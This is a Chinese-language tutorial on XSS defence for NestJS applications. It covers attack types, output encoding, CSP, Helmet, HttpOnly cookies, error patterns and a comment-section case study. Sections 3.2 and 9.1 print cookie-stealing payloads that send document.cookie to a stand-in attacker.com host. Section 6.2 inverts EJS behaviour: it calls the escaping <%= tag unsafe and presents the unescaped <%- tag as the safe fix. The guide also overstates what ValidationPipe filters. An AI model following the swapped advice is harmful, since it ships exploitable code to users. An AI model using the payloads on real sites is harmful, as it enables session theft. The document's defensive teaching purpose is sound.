# XSS攻击防护

## 1. XSS攻击概述

跨站脚本攻击（Cross-Site Scripting，简称XSS）是一种常见的Web安全漏洞，攻击者通过在网页中注入恶意脚本，当用户访问该网页时，恶意脚本会在用户浏览器中执行，从而获取用户敏感信息、篡改页面内容或执行其他恶意操作。

### 1.1 XSS攻击的危害

- 窃取用户Cookie和会话信息
- 劫持用户会话，执行未授权操作
- 窃取用户个人信息（如用户名、密码、信用卡信息）
- 篡改网页内容，进行钓鱼攻击
- 发起DDoS攻击
- 安装恶意软件
- 访问用户设备的摄像头和麦克风

### 1.2 XSS攻击的特点

- 隐蔽性强：攻击者可以通过各种方式注入恶意脚本
- 传播范围广：可以通过社交媒体、邮件等方式传播
- 危害严重：可以导致用户信息泄露、系统被控制等

## 2. XSS攻击类型

### 2.1 存储型XSS（Persistent XSS）

存储型XSS是最危险的XSS类型，攻击者将恶意脚本存储到目标网站的数据库中，当其他用户访问包含该恶意脚本的页面时，脚本会被执行。

**攻击流程**：
1. 攻击者在评论区、论坛等地方提交包含恶意脚本的内容
2. 网站将恶意脚本存储到数据库
3. 其他用户访问包含该内容的页面
4. 恶意脚本从数据库中读取并在用户浏览器中执行

**常见场景**：
- 评论区
- 论坛帖子
- 用户资料
- 博客文章

### 2.2 反射型XSS（Reflected XSS）

反射型XSS是最常见的XSS类型，攻击者通过诱使用户点击包含恶意脚本的链接，当用户点击链接时，恶意脚本会被反射到用户浏览器中执行。

**攻击流程**：
1. 攻击者构造包含恶意脚本的URL
2. 攻击者通过邮件、社交媒体等方式诱导用户点击该URL
3. 用户点击URL，向服务器发送请求
4. 服务器将恶意脚本作为响应的一部分返回给用户
5. 恶意脚本在用户浏览器中执行

**常见场景**：
- 搜索结果页
- 错误信息页
- URL参数传递

### 2.3 DOM型XSS（DOM-based XSS）

DOM型XSS是一种基于DOM的XSS攻击，攻击者通过修改页面的DOM结构来执行恶意脚本，不需要与服务器交互。

**攻击流程**：
1. 攻击者构造包含恶意脚本的URL
2. 用户点击URL，页面加载
3. 页面中的JavaScript代码处理URL参数
4. 恶意脚本修改页面DOM结构
5. 恶意脚本在用户浏览器中执行

**常见场景**：
- 单页应用（SPA）
- 动态生成页面内容
- 客户端模板渲染

## 3. XSS攻击的工作原理

### 3.1 基本攻击示例

假设有一个搜索功能，后端代码如下：

```typescript
@Get('search')
search(@Query('q') query: string) {
  return `搜索结果：${query}`;
}
```

攻击者构造URL：
```
http://example.com/search?q=<script>alert('XSS')</script>
```

当用户访问该URL时，浏览器会执行`<script>alert('XSS')</script>`，弹出警告框。

### 3.2 高级攻击技术

- 窃取Cookie：`document.cookie`
- 发送数据到攻击者服务器：`new Image().src = 'http://attacker.com/steal?cookie=' + document.cookie`
- 执行AJAX请求：使用XMLHttpRequest或fetch API执行未授权操作
- 操作DOM：修改页面内容、添加恶意表单等
- 执行键盘记录：监听用户键盘事件

## 4. XSS防护技术

### 4.1 输入验证与过滤

- **输入验证**：验证用户输入的数据类型、长度、格式等
- **输入过滤**：过滤或转义特殊字符，如`<`、`>`、`&`、`"`、`'`等
- **白名单验证**：只允许特定的输入格式

### 4.2 输出编码

输出编码是预防XSS的关键，将用户输入的数据在输出到HTML页面时进行编码，确保浏览器将其作为纯文本处理，而不是HTML或JavaScript。

#### 4.2.1 HTML编码

将特殊字符转换为HTML实体：
- `<` → `&lt;`
- `>` → `&gt;`
- `&` → `&amp;`
- `"` → `&quot;`
- `'` → `&#x27;`

#### 4.2.2 JavaScript编码

将特殊字符转换为JavaScript字符串转义序列：
- `'` → `\'`
- `"` → `\"`
- `<` → `\x3c`
- `>` → `\x3e`

#### 4.2.3 URL编码

将特殊字符转换为URL编码：
- ` ` → `%20`
- `<` → `%3c`
- `>` → `%3e`

### 4.3 内容安全策略（CSP）

内容安全策略（Content Security Policy，简称CSP）是一种HTTP头部，用于限制浏览器可以加载的资源来源，防止XSS攻击。

**常见CSP指令**：
- `default-src`：默认资源加载策略
- `script-src`：允许加载脚本的来源
- `style-src`：允许加载样式的来源
- `img-src`：允许加载图片的来源
- `connect-src`：允许XMLHttpRequest、WebSocket等连接的来源
- `frame-src`：允许加载iframe的来源

### 4.4 HttpOnly Cookie

设置Cookie的HttpOnly属性，防止JavaScript访问Cookie，减少Cookie被窃取的风险。

### 4.5 避免内联脚本

- 避免使用内联脚本（`<script>...</script>`）
- 避免使用内联事件处理器（如`onclick`、`onload`等）
- 使用外部脚本文件，并设置适当的CSP策略

### 4.6 安全的模板引擎

使用安全的模板引擎，模板引擎会自动对输出进行编码，防止XSS攻击。

## 5. NestJS中的XSS防护

### 5.1 使用Helmet中间件

Helmet是一个安全中间件集合，可以帮助保护NestJS应用免受各种Web安全威胁，包括XSS攻击。

#### 5.1.1 安装Helmet

```bash
npm install helmet
```

#### 5.1.2 配置Helmet

```typescript
// main.ts
import { NestFactory } from '@nestjs/core';
import { AppModule } from './app.module';
import helmet from 'helmet';

async function bootstrap() {
  const app = await NestFactory.create(AppModule);
  
  // 使用Helmet中间件
  app.use(helmet());
  
  // 配置CSP
  app.use(helmet.contentSecurityPolicy({
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'", "trusted-scripts.com"],
      styleSrc: ["'self'", "trusted-styles.com"],
      imgSrc: ["'self'", "data:", "trusted-images.com"],
    },
  }));
  
  await app.listen(3000);
}
bootstrap();
```

### 5.2 输入验证与过滤

使用NestJS的ValidationPipe和class-validator进行输入验证和过滤。

#### 5.2.1 安装依赖

```bash
npm install class-validator class-transformer
```

#### 5.2.2 配置ValidationPipe

```typescript
// main.ts
import { NestFactory } from '@nestjs/core';
import { AppModule } from './app.module';
import { ValidationPipe } from '@nestjs/common';

async function bootstrap() {
  const app = await NestFactory.create(AppModule);
  
  // 使用ValidationPipe进行输入验证
  app.useGlobalPipes(new ValidationPipe({
    whitelist: true, // 过滤掉未在DTO中定义的属性
    forbidNonWhitelisted: true, // 当存在未定义的属性时抛出错误
    transform: true, // 自动转换类型
  }));
  
  await app.listen(3000);
}
bootstrap();
```

#### 5.2.3 创建DTO进行输入验证

```typescript
// create-post.dto.ts
import { IsString, MaxLength, MinLength } from 'class-validator';

export class CreatePostDto {
  @IsString()
  @MinLength(1)
  @MaxLength(100)
  title: string;
  
  @IsString()
  @MinLength(1)
  @MaxLength(1000)
  content: string;
}
```

### 5.3 输出编码

使用模板引擎或手动进行输出编码。

#### 5.3.1 使用EJS模板引擎

EJS模板引擎会自动对输出进行HTML编码：

```ejs
<!-- posts.ejs -->
<h1><%= post.title %></h1>
<p><%= post.content %></p>
```

#### 5.3.2 手动输出编码

使用`escape-html`库进行HTML编码：

```bash
npm install escape-html
```

```typescript
import * as escapeHtml from 'escape-html';

@Get('post/:id')
async getPost(@Param('id') id: string) {
  const post = await this.postService.findOne(id);
  return {
    title: escapeHtml(post.title),
    content: escapeHtml(post.content),
  };
}
```

### 5.4 设置HttpOnly Cookie

在NestJS中设置Cookie的HttpOnly属性：

```typescript
@Post('login')
async login(@Body() loginDto: LoginDto, @Res() res: Response) {
  const user = await this.authService.validateUser(loginDto);
  const token = await this.authService.generateToken(user);
  
  // 设置HttpOnly Cookie
  res.cookie('token', token, {
    httpOnly: true,
    secure: true, // 在生产环境中设置为true
    sameSite: 'strict', // 防止CSRF攻击
    maxAge: 3600000, // 1小时
  });
  
  return res.json({ message: '登录成功' });
}
```

### 5.5 使用安全的响应头

设置适当的响应头来防止XSS攻击：

```typescript
// main.ts
import { NestFactory } from '@nestjs/core';
import { AppModule } from './app.module';

async function bootstrap() {
  const app = await NestFactory.create(AppModule);
  
  // 设置X-XSS-Protection头
  app.use((req, res, next) => {
    res.setHeader('X-XSS-Protection', '1; mode=block');
    next();
  });
  
  await app.listen(3000);
}
bootstrap();
```

## 6. 常见错误模式与避免方法

### 6.1 不安全的输出

**错误示例**：
```typescript
@Get('search')
search(@Query('q') query: string) {
  return `<div>搜索结果：${query}</div>`;
}
```

**正确示例**：
```typescript
import * as escapeHtml from 'escape-html';

@Get('search')
search(@Query('q') query: string) {
  return `<div>搜索结果：${escapeHtml(query)}</div>`;
}
```

### 6.2 不安全的模板渲染

**错误示例**：
```ejs
<!-- 不安全的模板渲染 -->
<div><%= post.content %></div>
```

**正确示例**：
```ejs
<!-- 安全的模板渲染 -->
<div><%- post.content %></div>
```

### 6.3 不安全的DOM操作

**错误示例**：
```typescript
// 前端代码
const searchQuery = new URLSearchParams(window.location.search).get('q');
document.getElementById('search-result').innerHTML = `搜索结果：${searchQuery}`;
```

**正确示例**：
```typescript
// 前端代码
const searchQuery = new URLSearchParams(window.location.search).get('q');
document.getElementById('search-result').textContent = `搜索结果：${searchQuery}`;
```

### 6.4 信任用户输入

**错误示例**：
```typescript
@Post('create-post')
async createPost(@Body() createPostDto: CreatePostDto) {
  // 直接信任用户输入，不进行验证和过滤
  return await this.postService.create(createPostDto);
}
```

**正确示例**：
```typescript
@Post('create-post')
async createPost(@Body(new ValidationPipe()) createPostDto: CreatePostDto) {
  // 使用ValidationPipe进行输入验证和过滤
  return await this.postService.create(createPostDto);
}
```

## 7. 测试与审计

### 7.1 代码审计

- 检查所有用户输入是否经过验证和过滤
- 检查所有输出是否经过编码
- 检查是否使用了安全的中间件（如Helmet）
- 检查Cookie是否设置了HttpOnly属性
- 检查是否配置了适当的CSP策略

### 7.2 渗透测试

- 使用自动化工具（如OWASP ZAP、Burp Suite）进行XSS测试
- 手动测试常见XSS注入点
- 测试各种XSS攻击向量

### 7.3 静态代码分析

- 使用ESLint插件检测不安全的DOM操作
- 使用安全扫描工具检测XSS漏洞
- 集成安全扫描到CI/CD流程

## 8. 最佳实践

1. **始终进行输入验证和过滤**：验证所有用户输入的数据类型、长度、格式等
2. **始终进行输出编码**：将用户输入的数据在输出到HTML页面时进行编码
3. **使用安全的中间件**：使用Helmet等安全中间件保护应用
4. **配置适当的CSP策略**：限制浏览器可以加载的资源来源
5. **设置HttpOnly Cookie**：防止JavaScript访问Cookie
6. **避免内联脚本和内联事件处理器**：使用外部脚本文件，并设置适当的CSP策略
7. **使用安全的模板引擎**：使用会自动对输出进行编码的模板引擎
8. **定期更新依赖**：及时修复已知安全漏洞
9. **进行安全测试**：定期进行渗透测试和代码审计
10. **培训开发人员**：提高开发人员的安全意识

## 9. 案例分析

### 9.1 实际XSS漏洞

**案例**：某社交媒体平台的评论功能存在存储型XSS漏洞

**漏洞代码**：
```typescript
@Post('comments')
async createComment(@Body('content') content: string) {
  // 直接存储用户输入，不进行验证和过滤
  return await this.commentService.create({ content });
}

@Get('comments/:postId')
async getComments(@Param('postId') postId: string) {
  const comments = await this.commentService.findByPostId(postId);
  // 直接返回评论内容，不进行输出编码
  return comments;
}
```

**攻击向量**：攻击者在评论中输入 `<script>document.location.href='http://attacker.com/steal?cookie='+document.cookie</script>`

**修复方法**：
1. 使用ValidationPipe进行输入验证和过滤
2. 对输出进行HTML编码
3. 配置CSP策略

```typescript
// 修复后的代码
@Post('comments')
async createComment(@Body(new ValidationPipe()) createCommentDto: CreateCommentDto) {
  return await this.commentService.create(createCommentDto);
}

@Get('comments/:postId')
async getComments(@Param('postId') postId: string) {
  const comments = await this.commentService.findByPostId(postId);
  // 对输出进行HTML编码
  return comments.map(comment => ({
    ...comment,
    content: escapeHtml(comment.content)
  }));
}
```

### 9.2 修复后的安全实现

使用Helmet中间件和CSP策略：

```typescript
// main.ts
import { NestFactory } from '@nestjs/core';
import { AppModule } from './app.module';
import helmet from 'helmet';
import { ValidationPipe } from '@nestjs/common';

async function bootstrap() {
  const app = await NestFactory.create(AppModule);
  
  // 使用Helmet中间件
  app.use(helmet());
  
  // 配置CSP
  app.use(helmet.contentSecurityPolicy({
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'"],
      styleSrc: ["'self'"],
      imgSrc: ["'self'", "data:"],
    },
  }));
  
  // 使用ValidationPipe进行输入验证
  app.useGlobalPipes(new ValidationPipe({
    whitelist: true,
    forbidNonWhitelisted: true,
    transform: true,
  }));
  
  await app.listen(3000);
}
bootstrap();
```

## 10. 总结

XSS攻击是一种严重的Web安全威胁，但通过采取适当的预防措施，可以有效避免。在NestJS应用中，主要防护措施包括：

- 使用Helmet中间件保护应用
- 配置适当的CSP策略
- 进行输入验证和过滤
- 对输出进行编码
- 设置HttpOnly Cookie
- 避免内联脚本和内联事件处理器
- 使用安全的模板引擎
- 定期更新依赖和进行安全测试

通过结合这些措施，可以构建出安全可靠的NestJS应用，有效抵御XSS攻击。